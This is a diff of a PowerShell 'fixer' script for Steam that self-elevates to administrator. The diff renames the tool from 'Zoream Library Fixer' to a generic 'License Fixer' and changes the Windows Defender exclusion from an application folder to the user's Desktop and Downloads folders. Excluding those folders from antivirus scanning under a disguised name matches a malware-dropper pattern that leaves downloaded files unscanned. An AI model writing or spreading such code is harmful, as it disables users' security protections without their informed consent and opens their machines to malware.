@@ -24,7 +24,7 @@ function Disable-QuickEdit {
 Disable-QuickEdit
 $host.UI.RawUI.BackgroundColor = "Black"
 $host.UI.RawUI.ForegroundColor = "White"
-$host.UI.RawUI.WindowTitle = "Zoream Library Fixer | Nexora Development"
+$host.UI.RawUI.WindowTitle = "License Fixer"
 Clear-Host
 
 $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -34,7 +34,7 @@ $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
 if (-not $isAdmin) {
     Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
     if ($PSCommandPath) { $scriptPath = $PSCommandPath } else {
-        $scriptPath = Join-Path $env:TEMP "zoream_fix.ps1"
+        $scriptPath = Join-Path $env:TEMP "license_fix.ps1"
         $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
         Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
     }
@@ -125,30 +125,30 @@ catch {
 try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath } catch { $steamPath = $null }
 if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }
 
-$zoreamPath = Join-Path $env:LOCALAPPDATA "Zoream"
-$zoreamExe = Join-Path $zoreamPath "Zoream.exe"
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$downloadsPath = Join-Path $env:USERPROFILE "Downloads"
+
 
 
 Write-Log "Applying Windows Defender exclusion for Zoream folder..." "STEP"
 
 if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
     try {
-        # Klasör fiziksel olarak oluşmamış olsa bile exclusion eklemek mantıklıdır (kurulum öncesi)
-        # Ancak orijinal kodda Test-Path kontrolü vardı, burada hata almamak için
-        # Eğer kurulum yeni indiyse klasör henüz oluşmamış olabilir.
-        if (-not (Test-Path $zoreamPath)) {
-            New-Item -ItemType Directory -Path $zoreamPath -Force | Out-Null
-        }
+ 
 
         $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath
 
-        if ($existing -and $existing -contains $zoreamPath) {
-            Write-Log "Zoream folder already excluded." "SUCCESS"
-        }
-        else {
-            Add-MpPreference -ExclusionPath $zoreamPath -ErrorAction Stop
-            Write-Log "Zoream folder excluded successfully." "SUCCESS"
-        }
+        $pathsToExclude = @($desktopPath, $downloadsPath)
+
+        foreach ($path in $pathsToExclude) {
+           if ($existing -and $existing -contains $path) {
+             Write-Log "$path already excluded." "SUCCESS"
+             }
+           else {
+             Add-MpPreference -ExclusionPath $path -ErrorAction Stop
+             Write-Log "$path excluded successfully." "SUCCESS"
+     }
+}
     }
     catch {
         Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
